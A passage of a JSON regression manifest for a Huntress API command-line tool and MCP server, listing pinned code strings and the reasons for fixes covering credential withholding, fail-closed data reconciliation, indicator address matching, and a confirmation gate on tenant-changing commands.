+     "contains": "_ = os.RemoveAll(filepath.Join(c.cacheDir, legacyResponseCacheResources))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return filepath.Join(c.responseCacheRoot(), cacheResourceTag(path))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "_ = os.RemoveAll(c.responseCacheRoot())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if _, ferr := c.funnelSuccessBody(env, authHeader); ferr != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func successBodyRefused(body []byte) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if successBodyRefused(body) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if raw, _, ok := UnwrapBinaryResponse(body); ok && successBodyEchoes(raw) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return successBodyWindowsEcho(body) || successBodyTokensEcho(body)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func successBodyTokensEcho(body []byte) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func nextJSONToken(body []byte, pos int) (start, end int) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func successBodyWindowsEcho(body []byte) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel_class_test.go",
+     "contains": "func TestSuccessFunnelClassCachedBodyIsChecked(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel_class_test.go",
+     "contains": "func TestSuccessFunnelClassCleanCachedBodyIsServed(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel_class_test.go",
+     "contains": "func TestSuccessFunnelClassPreFixCacheEntriesAreNeverRead(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel_class_test.go",
+     "contains": "func TestSuccessFunnelClassLargeBodyIsCheckedWhole(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel_class_test.go",
+     "contains": "func TestSuccessFunnelClassLargeCleanJSONIsReturned(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel_class_test.go",
+     "contains": "func TestSuccessFunnelClassBinaryEnvelopeIsChecked(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel_class_test.go",
+     "contains": "func TestSuccessFunnelClassLargeBinaryEnvelopeTextIsChecked(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/success_funnel_class_test.go",
+     "contains": "func TestSuccessFunnelClassEnvelopeShapedJSONIsCheckedWhole(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ],
+   "hand_wired": {
+    "mask-return": "maskCredentialText returns cliutil.FunnelWithhold(finishCredentialMask(masked, secrets), append(held, credentialFragments(held)...)): the 4.34.0 return shape plus every 8-character run of each held value (TestPartialCredentialEchoIsWithheldFromErrors)",
+    "helpers": "holdCredentials takes the request's extra credentials (holdCredentials(extraCredentials ...string)), so funnelSuccessBody holds the resolved auth header before it checks a 2xx body; called with no arguments it is the canonical helper"
+   }
+  },
+  {
+   "id": "novel-wrong-result-classes",
+   "class": "novel-wrong-result",
+   "summary": "Local novels reconcile flat and reseller alias copies against completed sync snapshots and merged account identity; every list is read through one envelope parser; unreadable inputs are withheld as unknown, never published as 0; blast-radius parses address tokens.",
+   "why": "An MSP acts on these numbers (billing, coverage, incident triage). The union of alias copies resurrected rows a later complete sync removed and split one account into two billing groups (200 seats for 100); an HTTP 200 without the agents array read as zero deployed agents; a null EDR minimum still published minimum_usage_total 0; unreadable timestamps were bucketed as new, averaged away or silently skipped; blast-radius matched dotted names as substrings and missed other spellings of an address; a legacy sync_state silently skipped the completeness warning. Each class now fails closed: the right number, or the number withheld with a warning naming what could not be read. A reprint regenerates none of these hand-written novel files, but a re-onboard or replay that restores an older copy would bring every class back. Codex round 1 (2026-10-24): Codex r1 on fix B (fix C): a row is left out as removed upstream only when a FULL walk of its scope (from the first page in one run, to a proven natural end, with no --param/--global-param/--resource-param filter) recorded in the hand-written walk_coverage table (store/extras.go, written by five one-line sync.go call sites) started after the row was written; filtered, resumed, unfinished, scope-unknown and unrecorded later syncs keep the row, counted and named in a warning, and blast-radius's SQL prefilter is a superset of what the Go matcher accepts (IPv4-mapped IPv6, Unicode case variants, non-text array elements). Indicator class fix (2026-10-24, after the review budget stop): the --indicator argument and every stored-text token are read by one parser, parseAddressToken (label such as ip:/host:/mac:, brackets, port, IPv6 zone, IPv4-mapped prefix, dots at either end), so an indicator with a port matches the same address; a match that covers only part of an address the parser finds (including one after a label) is a fragment, never exact. Property tests: every accepted spelling used as the indicator matches a row holding any other spelling of the same address, through the command and its SQL prefilter; a partial address is never exact. SKILL.md lists the 13 tools HUNTRESS_MCP_READ_ONLY=1 removes, measured from tools/list.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func reconcileEntity(ctx context.Context, db *sql.DB, entity string, states map[string]aliasState, parents map[string]bool) (*entityView, reconcileReport, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func (n *novelStore) src(entity string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func openStoreFor(cmd *cobra.Command, flags *rootFlags, dbPath string, entities ...string) (*novelStore, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func readAliasStates(ctx context.Context, db *sql.DB, types []string) (map[string]aliasState, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "could not check whether the last sync of %s finished",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "id := view.ident[fmt.Sprint(r[\"pp_eid\"])]",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "reason = \"no copy names its account\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func seatQuantity(v interface{}) (int, bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func newIndicatorMatcher(s string) indicatorMatcher {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func (m indicatorMatcher) ipInToken(tok string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "fragments := incFrag + agFrag + portFrag",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func parseListPage(raw []byte, key string) ([]map[string]interface{}, string, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func collectionAt(obj map[string]interface{}, key string) ([]interface{}, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func remediationsOf(v interface{}) (items []interface{}, total int, complete, known bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "hadPrior := e == nil",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "unknownAge := &bucket{Label: \"unknown age\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "AS unreadable_timestamps,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "AS stale_unknown,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func unreadableTimeSQL(alias, field string, required bool) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reseller_rollup.go",
+     "contains": "page, next, err := parseListPage(raw, arrayKey)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reseller_rollup.go",
+     "contains": "row[\"unreadable_inputs\"] = unreadable",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reseller_rollup.go",
+     "contains": "edrUnknown := append(append([]string{}, agg.edr.unknown...), unattributedEDR...)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_summary.go",
+     "contains": "AS stale_agents_unknown,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_summary.go",
+     "contains": "delete(out, \"pp_unreadable_critical_age\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/signal_digest.go",
+     "contains": "SUM(CASE WHEN %[8]s THEN 1 ELSE 0 END) AS pp_unreadable",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/escalation_queue.go",
+     "contains": "orgs, err = decodeJSONList([]byte(s))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/incident_detail.go",
+     "contains": "remediations, total, complete, known := remediationsOf(incident[\"remediations\"])",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestAliasReconcileWarnsWhenALaterCompleteSyncDidNotReturnARow(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestAliasReconcileDropsARowALaterCompleteSyncOfItsScopeDidNotReturn(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestAliasReconcileTreatsAStaleFlatRowByEvidence(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestAliasReconcileDoesNotFlagRowsOutsideALaterWalksScope(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestAliasReconcileIgnoresAPartitionThatWalkedNothing(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestBillingReconcileKeepsTheAccountAcrossAliases(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestBillingReconcileReportsUnattributedInvoices(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestBillingReconcileRefusesConflictingAccountIdentity(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestBillingReconcileFlatOnlyStoreStillTotals(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestBlastRadiusParsesAddressTokens(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestResellerRollupRefusesUnreadableAgentEnvelopes(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestResellerRollupRefusesAnUnreadableAccountList(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestIncidentRemediationsEnvelopeMustBeReadable(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestEscalationOrganizationsMustBeReadable(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestDriftRefusesAnUnreadableSnapshot(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestResellerRollupWithholdsTotalsBuiltOnUnreadableInputs(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestBillingReconcileWithholdsAnUnreadableQuantity(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestTriageAgeDoesNotBucketAnUnreadableAgeAsNew(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestFleetSummaryDoesNotHideUnreadableTimestamps(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestMTTRWithholdsAMeanOverUnreadableTimestamps(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestCoverageGapsCountsUnreadableCallbacks(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestWindowedNovelsWarnAboutUnreadableTimestamps(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestNovelsWarnWhenSyncCompletenessCannotBeChecked(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "func TestBillingReconcileWithholdsAnUnorderableBillingPeriod(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "noteWalkStart(db, resource, requestedAt, existingCursor != \"\", syncPruneSkipReason(resource, false, effectiveSince, \"\", userParams, resourceReconcileMode(resource), scopeKey), syncEvents)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "recordWalkCoverage(db, resource, \"\", requestedAt, existingCursor != \"\", outcome.complete, syncPruneSkipReason(resource, false, effectiveSince, \"\", userParams, reconcileMode, scopeKey), syncEvents)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "walkStarted := time.Now()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "recordWalkCoverage(db, dep.Name, parentID, walkStarted, false, rep.complete, syncPruneSkipReason(dep.Name, true, depSinceTS, \"\", userParams, dep.ReconcileMode, syncCheckpointScope(dep.Name, true, userParams, syncClientTemplateVars(c), syncActivePathContext())), syncEvents)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "recordWalkCoverage(db, dep.Name, \"\", started, false, attemptComplete, syncPruneSkipReason(dep.Name, true, depSinceTS, \"\", userParams, dep.ReconcileMode, scopeKey), syncEvents)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/extras.go",
+     "contains": "walkCoverageCreateSQL,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/extras.go",
+     "contains": "func (s *Store) NoteWalkStart(resourceType, scope string, started time.Time, filtered, resumed bool) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/extras.go",
+     "contains": "func (s *Store) RecordWalkCoverage(resourceType, scope string, started, ended time.Time, complete, filtered, resumed bool) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/extras.go",
+     "contains": "if complete && !filtered && !resumed {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func readWalkCoverage(ctx context.Context, db *sql.DB, types []string) (map[coverageKey]walkCoverage, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func recordWalkCoverage(db *store.Store, resource, scope string, started time.Time, resumed, complete bool, skipReason string, syncEvents io.Writer) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func noteWalkStart(db *store.Store, resource string, started time.Time, resumed bool, skipReason string, syncEvents io.Writer) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func reconcileAliases(ctx context.Context, db *sql.DB, entity string, states map[string]aliasState, cov map[coverageKey]walkCoverage, parents map[string]bool) (*entityView, reconcileReport, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "view, rep, err := reconcileAliases(ctx, db, entity, states, cov, parents)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "case hasRes && later(rc.fullStarted) && scopeSeenWithin(y, eid, rc.fullStarted, rc.fullEnded.Add(reconcileSlack)):",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "case !scopeHeld(y, eid):",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "unrecorded := laterComplete && (!hasRes || sy.at.After(rc.lastEnded.Add(reconcileSlack)))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "if yc.rowid == win.rowid && yc.rt == win.rt {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "case c.lastResumed:",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func warnFilteredFreshness(w io.Writer, entity string, types []string, cov map[coverageKey]walkCoverage, maxAge time.Duration) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "warnFilteredFreshness(w, e, sortedTypes, view.coverage, flags.maxAge)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "return []string{likeLiteral(v4.String()), \"%ffff%\"}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func foldSafeLike(lower string) (string, bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "typeCand, typeArgs := jsonArrayCandidateSQL(\"i\", \"indicator_types\", typePats)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "macLike, macArgs := jsonArrayCandidateSQL(\"a\", \"mac_addresses\", pats)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "if before && after && !insideLongerAddress(lt, start, end) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "if m.fragmentIn(v) != \"\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "card[\"organization_found\"] = false",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_class_fix_test.go",
+     "contains": "rec.RecordWalkCoverage(rt, \"\", now.Add(-m.ago), now, true, false, false)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_provenance_fix_test.go",
+     "contains": "func TestFilteredSyncDoesNotRemoveRowsItsFilterExcluded(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_provenance_fix_test.go",
+     "contains": "func TestParamFilteredSyncDoesNotRemoveRows(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_provenance_fix_test.go",
+     "contains": "func TestResumedSyncIsNotProofOfAbsence(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_provenance_fix_test.go",
+     "contains": "func TestFlatOnlyResyncDoesNotFlagSubAccountAgents(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_provenance_fix_test.go",
+     "contains": "func TestOrgScorecardWithholdsCountsForAnOrgNotInTheStore(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_provenance_fix_test.go",
+     "contains": "func TestFilteredSyncDoesNotMakeTheStoreLookFresh(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_provenance_fix_test.go",
+     "contains": "func TestLegacyFlatSyncCannotProveARowWasRemoved(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_provenance_fix_test.go",
+     "contains": "func TestResellerResyncLeavesOutAnAgentItsAccountWalkNoLongerReturns(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_provenance_fix_test.go",
+     "contains": "func TestFilteredResellerResyncKeepsAndFlagsTheAgentsItSkipped(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_provenance_fix_test.go",
+     "contains": "func TestLegacyPartitionCopyOlderThanALaterSyncIsFlagged(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_provenance_fix_test.go",
+     "contains": "func TestBlastRadiusPrefilterAdmitsEverySpellingTheMatcherAccepts(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_provenance_fix_test.go",
+     "contains": "func TestBlastRadiusLabelsAPartialAddressAFragmentOnEveryRowType(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_provenance_fix_test.go",
+     "contains": "func TestResumedSyncDoesNotMakeTheStoreLookFresh(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_provenance_fix_test.go",
+     "contains": "func TestSteadyStateResyncRaisesNoReconciliationWarning(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "func parseAddressToken(tok string) []addrForm {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "for _, f := range parseAddressToken(t) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "spellAddress(tok, start, start+i, allow&(allowIP|allowDomain), depth+1, out)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "for _, f := range parseAddressToken(lt[ts:te]) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence.go",
+     "contains": "if start < ae && end > as && (start > as || end < ae) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/indicator_spelling_property_test.go",
+     "contains": "func TestIndicatorSpellingsMatchEveryOtherSpelling(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/indicator_spelling_property_test.go",
+     "contains": "func TestPartialAddressIsNeverExact(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/indicator_spelling_property_test.go",
+     "contains": "func TestBlastRadiusFindsEverySpellingOfTheIndicator(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "`learnings_forget`), 13 of the 42 tools, and `huntress_read` still refuses every state-changing endpoint.",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "local-write commands that only touch the CLI's own learn store stay"
     }
    ]
+  },
+  {
+   "id": "escalation-queue-description-matches-output",
+   "class": "doc-claims-output",
+   "summary": "The MCP novel-feature list describes escalation-queue as it behaves: unresolved escalations ordered critical first and oldest first, with hours open and the organizations each one names",
+   "why": "The 4.34.0 render carried a research-time description (grouped by severity and organization) into internal/mcp/tools.go, guide.md and SKILL.md; the command orders rows and lists organizations per row, it does not group. An agent reading the MCP description would expect grouped output. Corrected at its source (research.json) in the factory, and by hand here; a re-render from the old research brings the stale text back.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "Unresolved escalations across the fleet, critical first and oldest first, with hours open and the organizations each one names",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "grouped by severity and organization"
+    }
+   ]
+  },
+  {
+   "id": "cli-writes-require-yes",
+   "class": "cli-write-without-confirm",
+   "summary": "Every CLI command that changes the Huntress tenant (endpoint commands whose pp:method is not GET/HEAD/OPTIONS, plus import) refuses before any client exists unless --yes or --dry-run is given; siem's read-only POST is the one allowlisted pp:path.",
+   "why": "Codex round 1 P1: `huntress-cli accounts incident-reports post-v1-accounts-account-id-id-remediations-bulk-approval 4421 98765 --agent` POSTed approval of every pending remediation (Huntress then carries them out on hosts) with no confirmation, while the MCP twin huntress_execute already required confirm=true. The gate is one call in the root PersistentPreRunE (write_confirm_gate.go), fail-closed on the method annotation so a future generated write command is covered without an edit; the refusal is a usage error (exit 2) with a JSON envelope carrying confirmation_required under --json/--agent. A --yes saved in a run profile does not count. Help examples of gated commands are rewritten at tree build so none shows a refused invocation. A reprint that drops the root.go call leaves the gate file dead; write_confirm_gate_test.go drives every write command against a fake API and fails if any sends without --yes. The same commit corrects novel descriptions that claimed output the commands do not produce (coverage percent, posture grade, invoice totals, version changes, outdated EDR versions, per-org subscription reconciliation); root.go and which.go are generated, so those corrections are pinned here and the old strings are banned.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "if err := enforceWriteConfirmation(cmd, flags); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate.go",
+     "contains": "func enforceWriteConfirmation(cmd *cobra.Command, flags *rootFlags) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate.go",
+     "contains": "func writeConfirmTarget(cmd *cobra.Command) (string, bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate.go",
+     "contains": "var writeConfirmReadPOSTPaths = map[string]bool{",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate.go",
+     "contains": "\"/v1/siem/query\": true,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate.go",
+     "contains": "if writeConfirmReadPOSTPaths[apiPath] {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate.go",
+     "contains": "\"import\": \"a POST for every record in its input\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate.go",
+     "contains": "_, fromProfile := profileAppliedFlagNames[\"yes\"]",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate.go",
+     "contains": "\"confirmation_required\": true,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate.go",
+     "contains": "return usageErr(err)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate.go",
+     "contains": "confirmWriteExamples(root)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate_test.go",
+     "contains": "func TestEveryWriteCommandRefusesWithoutConfirmation(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate_test.go",
+     "contains": "var gateReadPOSTPaths = map[string]bool{\"/v1/siem/query\": true}",
